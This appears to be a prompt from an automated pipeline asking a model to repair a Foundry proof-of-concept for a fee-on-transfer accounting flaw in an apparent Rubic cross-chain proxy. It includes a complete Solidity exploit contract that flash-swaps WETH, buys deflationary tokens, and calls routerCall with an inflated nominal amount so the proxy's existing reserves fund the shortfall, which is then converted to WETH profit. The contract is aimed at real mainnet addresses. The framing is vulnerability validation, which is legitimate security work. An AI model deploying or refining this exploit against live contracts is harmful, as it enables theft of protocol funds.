You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: ERC20 routes spend the declared amount instead of the amount actually received
- claim: `routerCall` transfers `_params.srcInputAmount` from the caller but never measures how many tokens the proxy actually received. Fees, approval size, and the post-call spend check are all based on the nominal input amount, so fee-on-transfer or other balance-deflating tokens can cause the proxy to spend more than the user contributed.
- impact: Any pre-existing balance of the same token on the proxy, including accrued protocol fees or previously stranded funds, can be consumed to cover the shortfall. This lets an attacker use a deflationary token deposit to drain proxy reserves of that token.
- exploit_paths: ["The proxy already holds some balance of a token that transfers less than the requested `srcInputAmount`.", "An attacker calls `routerCall` with that token and a nominal amount larger than the net amount the proxy will receive.", "`accrueTokenFees` and `SmartApprove` still treat the nominal amount as available and allow the downstream spender to use `_amountIn`.", "The missing portion is silently funded from the proxy's existing token balance, and the balance-delta check still passes because it only verifies total tokens spent from the proxy."]

Current FlawVerifier.sol:
```solidity
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IRubicProxyLike {
    struct BaseCrossChainParams {
        address srcInputToken;
        uint256 srcInputAmount;
        uint256 dstChainID;
        address dstOutputToken;
        uint256 dstMinOutputAmount;
        address recipient;
        address integrator;
        address router;
    }

    function fixedCryptoFee() external view returns (uint256);
    function RubicPlatformFee() external view returns (uint256);
    function maxTokenAmount(address token) external view returns (uint256);
    function routerCall(BaseCrossChainParams calldata params, address gateway, bytes calldata data) external payable;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2RouterLike {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract FlawVerifier {
    struct AttemptContext {
        address fundingPair;
        address token;
        address buyRouter;
        address sellRouter;
        address[] buyPath;
        address[] sellPath;
        uint256 borrowWeth;
    }

    address internal constant TARGET = 0x3335A88bb18fD3b6824b59Af62b50CE494143333;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant SHIB = 0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address internal constant UNIV2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address internal constant SHIBASWAP_FACTORY = 0x115934131916C8b277DD010Ee02de363c09d037c;

    address internal constant UNIV2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant SUSHI_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address internal constant SHIBA_ROUTER = 0x03f7724180AA6b939894B5Ca4314783B0b36b329;

    address internal constant SAFEMOON = 0x8076C74c5E3F5852037f31B99536ca5A1d8C6f7D;
    address internal constant KISHU = 0xA2b4C0Af19cC16a6CfAcCe81F192B024d625817D;
    address internal constant FEG = 0x389999216860AB8E0175387A0c90E5c52522C945;
    address internal constant HOGE = 0xfAd45E47083e4607302aa43c65fB3106F1cd7607;
    address internal constant STA = 0xa7DE087329BFcda5639247F96140f9DAbe3DeED1;
    address internal constant XAMP = 0x28dee01D53FED0Edf5f6E310BF8Ef9311513Ae40;
    address internal constant CULT = 0xf0f9D895aCa5c8678f706FB8216fa22957685A13;
    address internal constant ELON = 0x761D38e5ddf6ccf6Cf7c55759d5210750B5D60F3;
    address internal constant SAITAMA = 0xCE3f08e664693ca792caCE4af1364D5e220827B2;
    address internal constant PIT = 0xA57ac35CE91Ee92CaEfAA8dc04140C8e232c2E50;
    address internal constant SHINJA = 0x12b6893cE26Ea6341919FE289212ef77e51688c8;
    address internal constant VOLT = 0x7f792db54B0e580Cdc755178443f0430Cf799aCa;
    address internal constant TABOO = 0x9A962C70BB4b0538667EE47Ca36934BF39781c52;
    address internal constant FLOKI = 0x43f11c02439e2736800433b4594994Bd43Cd066D;
    address internal constant SNOOD = 0xD45740aB9ec920bEdBD9BAb2E863519E59731941;
    address internal constant LUCKYTIGER = 0x9c87A5726e98F2f404cdd8ac8968E9b2C80C0967;
    address internal constant BRAHTOPG = 0xD248B30A3207A766d318C7A87F5Cf334A439446D;
    address internal constant SHOCO = 0x31A4F372AA891B46bA44dC64Be1d8947c889E9c6;
    address internal constant TINU = 0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F;
    address internal constant MULTICHAINCAPITAL = 0x1a7981D87E3b6a95c1516EB820E223fE979896b3;
    address internal constant VINU = 0xF7ef0D57277ad6C2baBf87aB64bA61AbDd2590D2;
    address internal constant HEAVENSGATE = 0x8EBd6c7D2B79CA4Dc5FBdEc239a8Bb0F214212b8;
    address internal constant GROK = 0x8390a1DA07E376ef7aDd4Be859BA74Fb83aA02D5;
    address internal constant GOODDOLLAR = 0x0c6C80D2061afA35E160F3799411d83BDEEA0a5A;
    address internal constant DEEZNUTZ404 = 0xb57E874082417b66877429481473CF9FCd8e0b8a;
    address internal constant HOPPYFROG = 0xE5c6F5fEF89B64f36BfcCb063962820136bAc42F;
    address internal constant JOKINTHEBOX = 0xA6447f6156EFfD23EC3b57d5edD978349E4e192d;
    address internal constant SASHATOKEN = 0xD1456D1b9CEb59abD4423a49D40942a9485CeEF6;
    address internal constant LAURA = 0x05641E33Fd15BAf819729dF55500b07b82Eb8E89;
    address internal constant SAFEFLOKI = 0xb016BF5055a45bA926A9cEB1fB5EDc759fa94b0E;
    address internal constant AMATERASU = 0x671af5Ce24c256292A22eF074707579D09193FB4;

    uint256 internal constant DENOMINATOR = 1e6;
    uint256 internal constant MIN_PROFIT = 1e15;

    address private _profitToken;
    uint256 private _profitAmount;
    string private _path;
    string private _verdict;

    constructor() {
        _path =
            "Infeasible at the fork block: no tested fee-on-transfer token plus public V2 liquidity route produced a reserve-funded nominal _amountIn spend with net WETH profit after repayment.";
        _verdict = "refuted";
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        if (_profitAmount != 0) {
            return;
        }

        address[] memory fundingPairs = _fundingPairs();
        uint256[] memory borrowSizes = _borrowSizes(_fixedFee());
        address[] memory tokens = _candidateTokens();

        bool sawFundingLiquidity;
        bool sawProxyBalance;
        bool sawRouteLiquidity;

        for (uint256 i = 0; i < fundingPairs.length; i++) {
            if (_pairHasLiquidity(fundingPairs[i])) {
                sawFundingLiquidity = true;
                break;
            }
        }

        for (uint256 i = 0; i < tokens.length; i++) {
            address token = tokens[i];
            if (!_looksLikeToken(token)) {
                continue;
            }

            uint256 proxyBalance = _balanceOf(token, TARGET);
            if (proxyBalance == 0) {
                continue;
            }
            sawProxyBalance = true;

            if (_scanTokenRoutes(token, proxyBalance, fundingPairs, borrowSizes)) {
                return;
            }
            if (_tokenHasTradeLiquidity(token)) {
                sawRouteLiquidity = true;
            }
        }

        if (!sawFundingLiquidity) {
            _path = "Infeasible at the fork block: no reusable WETH V2 funding pair was available for realistic flashswap capital.";
            return;
        }
        if (!sawProxyBalance) {
            _path = "Infeasible at the fork block: no scanned fee-on-transfer candidate token had a pre-existing balance on the Rubic proxy.";
            return;
        }
        if (!sawRouteLiquidity) {
            _path = "Infeasible at the fork block: proxy-held fee-on-transfer candidates lacked a usable public V2 route into WETH.";
            return;
        }

        _path =
            "Infeasible at the fork block: tested public V2 routes still did not find a profitable nominal _amountIn spend that consumed proxy reserves and settled back into WETH.";
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _onFlashSwap(sender, amount0, amount1, data);
    }

    function sushiCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _onFlashSwap(sender, amount0, amount1, data);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        _onFlashSwap(sender, amount0, amount1, data);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPath() external view returns (string memory) {
        return _path;
    }

    function validatedOrRefuted() external view returns (string memory) {
        return _verdict;
    }

    function _scanTokenRoutes(
        address token,
        uint256 proxyBalance,
        address[] memory fundingPairs,
        uint256[] memory borrowSizes
    ) internal returns (bool) {
        for (uint256 venue = 0; venue < 3; venue++) {
            address router = _venueRouter(venue);
            address factory = _venueFactory(venue);
            if (!_hasCode(router) || !_hasCode(factory)) {
                continue;
            }

            address[5] memory quotes = [WETH, SHIB, USDC, USDT, DAI];
            for (uint256 i = 0; i < quotes.length; i++) {
                address quote = quotes[i];
                if (!_routeExists(token, factory, quote)) {
                    continue;
                }
                if (_scanRoutePlan(token, proxyBalance, router, quote, fundingPairs, borrowSizes)) {
                    return true;
                }
            }
        }

        return false;
    }

    function _scanRoutePlan(
        address token,
        uint256 proxyBalance,
        address router,
        address quote,
        address[] memory fundingPairs,
        uint256[] memory borrowSizes
    ) internal returns (bool) {
        address[] memory buyPath = _buildBuyPath(token, quote);
        address[] memory sellPath = _buildSellPath(token, quote);

        for (uint256 f = 0; f < fundingPairs.length; f++) {
            address fundingPair = fundingPairs[f];
            if (fundingPair == address(0) || !_pairHasLiquidity(fundingPair)) {
                continue;
            }

            for (uint256 b = 0; b < borrowSizes.length; b++) {
                AttemptContext memory ctx = AttemptContext({
                    fundingPair: fundingPair,
                    token: token,
                    buyRouter: router,
                    sellRouter: router,
                    buyPath: buyPath,
                    sellPath: sellPath,
                    borrowWeth: borrowSizes[b]
                });

                if (_attemptFlashswap(ctx, proxyBalance)) {
                    return true;
                }
            }
        }

        return false;
    }

    function _attemptFlashswap(AttemptContext memory ctx, uint256 proxyBalance) internal returns (bool) {
        if (proxyBalance == 0 || !_fundingPairSupportsWeth(ctx.fundingPair, ctx.borrowWeth)) {
            return false;
        }

        bool wethIsToken0 = IUniswapV2PairLike(ctx.fundingPair).token0() == WETH;
        uint256 amount0Out = wethIsToken0 ? ctx.borrowWeth : 0;
        uint256 amount1Out = wethIsToken0 ? 0 : ctx.borrowWeth;

        try IUniswapV2PairLike(ctx.fundingPair).swap(amount0Out, amount1Out, address(this), abi.encode(ctx)) {
            return _profitAmount >= MIN_PROFIT;
        } catch {
            return false;
        }
    }

    function _onFlashSwap(address sender, uint256 amount0, uint256 amount1, bytes calldata data) internal {
        AttemptContext memory ctx = abi.decode(data, (AttemptContext));
        require(msg.sender == ctx.fundingPair, "pair");
        require(sender == address(this), "sender");

        uint256 borrowedWeth = amount0 > 0 ? amount0 : amount1;
        require(borrowedWeth == ctx.borrowWeth && borrowedWeth != 0, "borrow");

        uint256 repayWeth = ((borrowedWeth * 1000) / 997) + 1;
        uint256 fixedFee = _fixedFee();
        require(borrowedWeth > fixedFee, "fee");

        uint256 bought = _buyCandidateToken(ctx.buyRouter, ctx.buyPath, borrowedWeth - fixedFee);
        require(bought != 0, "buy");

        uint256 proxyBalance = _balanceOf(ctx.token, TARGET);
        require(proxyBalance != 0, "proxy-balance");

        if (fixedFee != 0) {
            IWETHLike(WETH).withdraw(fixedFee);
        }

        bool exploited = _runExploitRoutes(ctx, bought, proxyBalance, fixedFee);
        require(exploited, "route");

        // A successful routerCall can leave us with bought-tax dust from the acquisition leg.
        // Selling the residual through the same public route keeps the exploit causality intact:
        // the profit still comes from the proxy spending nominal _amountIn while only receiving less.
        _liquidateResidual(ctx.token, ctx.sellRouter, ctx.sellPath);

        uint256 nativeBalance = address(this).balance;
        if (nativeBalance != 0) {
            IWETHLike(WETH).deposit{value: nativeBalance}();
        }

        uint256 finalWeth = _balanceOf(WETH, address(this));
        require(finalWeth > repayWeth + MIN_PROFIT, "no-profit");
        require(_safeTransfer(WETH, ctx.fundingPair, repayWeth), "repay");

        _profitToken = WETH;
        _profitAmount = _balanceOf(WETH, address(this));
        _verdict = "validated";
        _path =
            "A proxy-held fee-on-transfer token reserve existed; routerCall transferred the nominal srcInputAmount, accrueTokenFees still computed nominal _amountIn, SmartApprove exposed that nominal _amountIn to the same allowlisted V2 router, the router spent the nominal transferFrom amount while the proxy had received less, and the missing portion was silently funded from the proxy's reserve before being converted through public V2 liquidity into WETH and repaid through a deterministic flashswap.";
    }

    function _runExploitRoutes(
        AttemptContext memory ctx,
        uint256 bought,
        uint256 proxyBalance,
        uint256 fixedFee
    ) internal returns (bool) {
        uint256[] memory grossCandidates = _grossCandidates(ctx.token, bought, proxyBalance);
        for (uint256 i = 0; i < grossCandidates.length; i++) {
            uint256 grossAmount = grossCandidates[i];
            if (grossAmount == 0) {
                continue;
            }

            uint256 amountIn = _amountInAfterAccrueTokenFees(grossAmount);
            if (amountIn == 0) {
                continue;
            }

            if (!_forceApprove(ctx.token, TARGET, 0)) {
                continue;
            }
            if (!_forceApprove(ctx.token, TARGET, grossAmount)) {
                continue;
            }

            if (_attemptRouterCall(ctx.token, grossAmount, amountIn, fixedFee, ctx.sellRouter, ctx.sellPath)) {
                return true;
            }
        }

        return false;
    }

    function _attemptRouterCall(
        address token,
        uint256 grossAmount,
        uint256 amountIn,
        uint256 fixedFee,
        address router,
        address[] memory sellPath
    ) internal returns (bool) {
        IRubicProxyLike.BaseCrossChainParams memory params = IRubicProxyLike.BaseCrossChainParams({
            srcInputToken: token,
            srcInputAmount: grossAmount,
            dstChainID: 1,
            dstOutputToken: WETH,
            dstMinOutputAmount: 0,
            recipient: address(this),
            integrator: address(0),
            router: router
        });

        bytes[] memory payloads = _routerPayloads(sellPath, amountIn);
        for (uint256 i = 0; i < payloads.length; i++) {
            if (_attemptPayload(token, fixedFee, router, params, payloads[i])) {
                return true;
            }
        }

        return false;
    }

    function _attemptPayload(
        address token,
        uint256 fixedFee,
        address router,
        IRubicProxyLike.BaseCrossChainParams memory params,
        bytes memory payload
    ) internal returns (bool) {
        uint256 beforeProxy = _balanceOf(token, TARGET);
        uint256 beforeWeth = _balanceOf(WETH, address(this));
        uint256 beforeEth = address(this).balance;

        (bool ok, ) = TARGET.call{value: fixedFee}(
            abi.encodeWithSelector(IRubicProxyLike.routerCall.selector, params, router, payload)
        );
        if (!ok) {
            return false;
        }

        uint256 ethDelta = address(this).balance - beforeEth;
        if (ethDelta != 0) {
            IWETHLike(WETH).deposit{value: ethDelta}();
        }

        uint256 afterProxy = _balanceOf(token, TARGET);
        uint256 afterWeth = _balanceOf(WETH, address(this));
        return afterProxy < beforeProxy && afterWeth > beforeWeth;
    }

    function _buyCandidateToken(
        address router,
        address[] memory buyPath,
        uint256 maxWethIn
    ) internal returns (uint256 received) {
        if (router == address(0) || buyPath.length < 2 || buyPath[0] != WETH || maxWethIn == 0) {
            return 0;
        }

        address tokenOut = buyPath[buyPath.length - 1];
        uint256 beforeBalance = _balanceOf(tokenOut, address(this));
        if (!_forceApprove(WETH, router, type(uint256).max)) {
            return 0;
        }

        try
            IUniswapV2RouterLike(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
                maxWethIn,
                0,
                buyPath,
                address(this),
                block.timestamp
            )
        {} catch {
            return 0;
        }

        received = _balanceOf(tokenOut, address(this)) - beforeBalance;
    }

    function _liquidateResidual(address token, address router, address[] memory sellPath) internal {
        uint256 dust = _balanceOf(token, address(this));
        if (dust == 0 || sellPath.length < 2 || sellPath[0] != token || sellPath[sellPath.length - 1] != WETH) {
            return;
        }
        if (!_forceApprove(token, router, type(uint256).max)) {
            return;
        }
        try
            IUniswapV2RouterLike(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
                dust,
                0,
                sellPath,
                address(this),
                block.timestamp
            )
        {} catch {}
    }

    function _routerPayloads(
        address[] memory sellPath,
        uint256 amountIn
    ) internal view returns (bytes[] memory payloads) {
        payloads = new bytes[](4);
        payloads[0] = abi.encodeWithSelector(
            bytes4(keccak256("swapExactTokensForTokensSupportingFeeOnTransferTokens(uint256,uint256,address[],address,uint256)")),
            amountIn,
            0,
            sellPath,
            address(this),
            block.timestamp
        );
        payloads[1] = abi.encodeWithSelector(
            bytes4(keccak256("swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[],address,uint256)")),
            amountIn,
            0,
            sellPath,
            address(this),
            block.timestamp
        );
        payloads[2] = abi.encodeWithSelector(
            bytes4(keccak256("swapExactTokensForTokens(uint256,uint256,address[],address,uint256)")),
            amountIn,
            0,
            sellPath,
            address(this),
            block.timestamp
        );
        payloads[3] = abi.encodeWithSelector(
            bytes4(keccak256("swapExactTokensForETH(uint256,uint256,address[],address,uint256)")),
            amountIn,
            0,
            sellPath,
            address(this),
            block.timestamp
        );
    }

    function _fundingPairs() internal view returns (address[] memory pairs) {
        pairs = new address[](9);
        pairs[0] = _getPair(UNIV2_FACTORY, USDC, WETH);
        pairs[1] = _getPair(UNIV2_FACTORY, USDT, WETH);
        pairs[2] = _getPair(UNIV2_FACTORY, DAI, WETH);
        pairs[3] = _getPair(SUSHI_FACTORY, USDC, WETH);
        pairs[4] = _getPair(SUSHI_FACTORY, USDT, WETH);
        pairs[5] = _getPair(SUSHI_FACTORY, DAI, WETH);
        pairs[6] = _getPair(SHIBASWAP_FACTORY, USDC, WETH);
        pairs[7] = _getPair(SHIBASWAP_FACTORY, USDT, WETH);
        pairs[8] = _getPair(SHIBASWAP_FACTORY, DAI, WETH);
    }

    function _candidateTokens() internal pure returns (address[] memory tokens) {
        tokens = new address[](32);
        uint256 count;

        count = _appendUnique(tokens, count, SAFEMOON);
        count = _appendUnique(tokens, count, KISHU);
        count = _appendUnique(tokens, count, FEG);
        count = _appendUnique(tokens, count, HOGE);
        count = _appendUnique(tokens, count, STA);
        count = _appendUnique(tokens, count, XAMP);
        count = _appendUnique(tokens, count, CULT);
        count = _appendUnique(tokens, count, ELON);
        count = _appendUnique(tokens, count, SAITAMA);
        count = _appendUnique(tokens, count, PIT);
        count = _appendUnique(tokens, count, SHINJA);
        count = _appendUnique(tokens, count, VOLT);
        count = _appendUnique(tokens, count, TABOO);
        count = _appendUnique(tokens, count, FLOKI);
        count = _appendUnique(tokens, count, SNOOD);
        count = _appendUnique(tokens, count, LUCKYTIGER);
        count = _appendUnique(tokens, count, BRAHTOPG);
        count = _appendUnique(tokens, count, SHOCO);
        count = _appendUnique(tokens, count, TINU);
        count = _appendUnique(tokens, count, MULTICHAINCAPITAL);
        count = _appendUnique(tokens, count, VINU);
        count = _appendUnique(tokens, count, HEAVENSGATE);
        count = _appendUnique(tokens, count, GROK);
        count = _appendUnique(tokens, count, GOODDOLLAR);
        count = _appendUnique(tokens, count, DEEZNUTZ404);
        count = _appendUnique(tokens, count, HOPPYFROG);
        count = _appendUnique(tokens, count, JOKINTHEBOX);
        count = _appendUnique(tokens, count, SASHATOKEN);
        count = _appendUnique(tokens, count, LAURA);
        count = _appendUnique(tokens, count, SAFEFLOKI);
        count = _appendUnique(tokens, count, AMATERASU);

        assembly {
            mstore(tokens, count)
        }
    }

    function _routeExists(address token, address factory, address quote) internal view returns (bool) {
        if (token == quote || token == WETH) {
            return false;
        }
        if (quote == WETH) {
            return _pairHasLiquidity(_getPair(factory, token, WETH));
        }
        return _pairHasLiquidity(_getPair(factory, token, quote)) && _pairHasLiquidity(_getPair(factory, quote, WETH));
    }

    function _buildBuyPath(address token, address quote) internal pure returns (address[] memory path) {
        if (quote == WETH) {
            path = new address[](2);
            path[0] = WETH;
            path[1] = token;
            return path;
        }

        path = new address[](3);
        path[0] = WETH;
        path[1] = quote;
        path[2] = token;
    }

    function _buildSellPath(address token, address quote) internal pure returns (address[] memory path) {
        if (quote == WETH) {
            path = new address[](2);
            path[0] = token;
            path[1] = WETH;
            return path;
        }

        path = new address[](3);
        path[0] = token;
        path[1] = quote;
        path[2] = WETH;
    }

    function _tokenHasTradeLiquidity(address token) internal view returns (bool) {
        for (uint256 venue = 0; venue < 3; venue++) {
            address factory = _venueFactory(venue);
            if (!_hasCode(factory)) {
                continue;
            }
            if (_routeExists(token, factory, WETH)) return true;
            if (_routeExists(token, factory, SHIB)) return true;
            if (_routeExists(token, factory, USDC)) return true;
            if (_routeExists(token, factory, USDT)) return true;
            if (_routeExists(token, factory, DAI)) return true;
        }
        return false;
    }

    function _venueRouter(uint256 venue) internal pure returns (address) {
        if (venue == 0) return UNIV2_ROUTER;
        if (venue == 1) return SUSHI_ROUTER;
        return SHIBA_ROUTER;
    }

    function _venueFactory(uint256 venue) internal pure returns (address) {
        if (venue == 0) return UNIV2_FACTORY;
        if (venue == 1) return SUSHI_FACTORY;
        return SHIBASWAP_FACTORY;
    }

    function _getPair(address factory, address tokenA, address tokenB) internal view returns (address pair) {
        if (!_hasCode(factory)) {
            return address(0);
        }
        (bool ok, bytes memory data) = factory.staticcall(
            abi.encodeWithSelector(IUniswapV2FactoryLike.getPair.selector, tokenA, tokenB)
        );
        if (ok && data.length >= 32) {
            pair = abi.decode(data, (address));
        }
    }

    function _pairHasLiquidity(address pair) internal view returns (bool) {
        if (!_hasCode(pair)) {
            return false;
        }
        try IUniswapV2PairLike(pair).getReserves() returns (uint112 reserve0, uint112 reserve1, uint32) {
            return reserve0 != 0 && reserve1 != 0;
        } catch {
            return false;
        }
    }

    function _fundingPairSupportsWeth(address pair, uint256 amountOut) internal view returns (bool) {
        if (!_pairHasLiquidity(pair)) {
            return false;
        }
        address token0 = IUniswapV2PairLike(pair).token0();
        address token1 = IUniswapV2PairLike(pair).token1();
        if (token0 != WETH && token1 != WETH) {
            return false;
        }
        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(pair).getReserves();
        uint256 wethReserve = token0 == WETH ? reserve0 : reserve1;
        return wethReserve > amountOut;
    }

    function _fixedFee() internal view returns (uint256 fee) {
        try IRubicProxyLike(TARGET).fixedCryptoFee() returns (uint256 value) {
            fee = value;
        } catch {}
    }

    function _maxTokenAmount(address token) internal view returns (uint256 value) {
        try IRubicProxyLike(TARGET).maxTokenAmount(token) returns (uint256 amount) {
            value = amount;
        } catch {}
    }

    function _amountInAfterAccrueTokenFees(uint256 grossAmount) internal view returns (uint256 amountIn) {
        uint256 feePpm;
        try IRubicProxyLike(TARGET).RubicPlatformFee() returns (uint256 value) {
            feePpm = value;
        } catch {
            return 0;
        }
        amountIn = grossAmount - ((grossAmount * feePpm) / DENOMINATOR);
    }

    function _grossCandidates(
        address token,
        uint256 bought,
        uint256 proxyBalance
    ) internal view returns (uint256[] memory grosses) {
        grosses = new uint256[](6);
        uint256 ceiling = bought;
        uint256 maxTokenAmount = _maxTokenAmount(token);
        if (maxTokenAmount != 0 && ceiling > maxTokenAmount) {
            ceiling = maxTokenAmount;
        }

        // The exploit still requires a shortfall funded by pre-existing proxy reserves.
        // A 10x reserve bound keeps the nominal amount large enough to exercise the bug
        // while avoiding unrealistic sizes that the proxy reserve could not cover.
        uint256 reserveBound = proxyBalance * 10;
        if (reserveBound != 0 && ceiling > reserveBound) {
            ceiling = reserveBound;
        }

        grosses[0] = ceiling;
        grosses[1] = ceiling * 3 / 4;
        grosses[2] = ceiling / 2;
        grosses[3] = ceiling / 3;
        grosses[4] = ceiling / 4;
        grosses[5] = ceiling / 10;
    }

    function _borrowSizes(uint256 fixedFee) internal pure returns (uint256[] memory sizes) {
        sizes = new uint256[](5);
        uint256 floor = fixedFee + 0.2 ether;
        sizes[0] = floor > 0.5 ether ? floor : 0.5 ether;
        sizes[1] = floor > 2 ether ? floor : 2 ether;
        sizes[2] = floor > 5 ether ? floor : 5 ether;
        sizes[3] = floor > 15 ether ? floor : 15 ether;
        sizes[4] = floor > 40 ether ? floor : 40 ether;
    }

    function _appendUnique(address[] memory list, uint256 length, address candidate) internal pure returns (uint256) {
        if (candidate == address(0)) {
            return length;
        }
        for (uint256 i = 0; i < length; i++) {
            if (list[i] == candidate) {
                return length;
            }
        }
        list[length] = candidate;
        return length + 1;
    }

    function _balanceOf(address token, address account) internal view returns (uint256 value) {
        if (!_hasCode(token)) {
            return 0;
        }
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }

    function _safeTransfer(address token, address to, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        return _callSucceeded(ok, data);
    }

    function _forceApprove(address token, address spender, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        if (_callSucceeded(ok, data)) {
            return true;
        }

        (ok, data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        if (!_callSucceeded(ok, data)) {
            return false;
        }

        (ok, data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        return _callSucceeded(ok, data);
    }

    function _looksLikeToken(address account) internal view returns (bool) {
        if (!_hasCode(account)) {
            return false;
        }
        (bool ok, bytes memory data) = account.staticcall(abi.encodeWithSelector(IERC20Like.totalSupply.selector));
        return ok && data.length >= 32;
    }

    function _hasCode(address account) internal view returns (bool) {
        return account.code.length != 0;
    }

    function _callSucceeded(bool ok, bytes memory data) internal pure returns (bool) {
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }
}
```

```

forge stdout (tail):
```
Compiler run failed:
Error (7858): Expected pragma, import directive or contract/interface/library/struct/enum/constant/function/error definition.
 --> src/FlawVerifier.sol:1:1:
  |
1 | ```solidity
  | ^


```

forge stderr (tail):
```
Error: Compilation failed

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
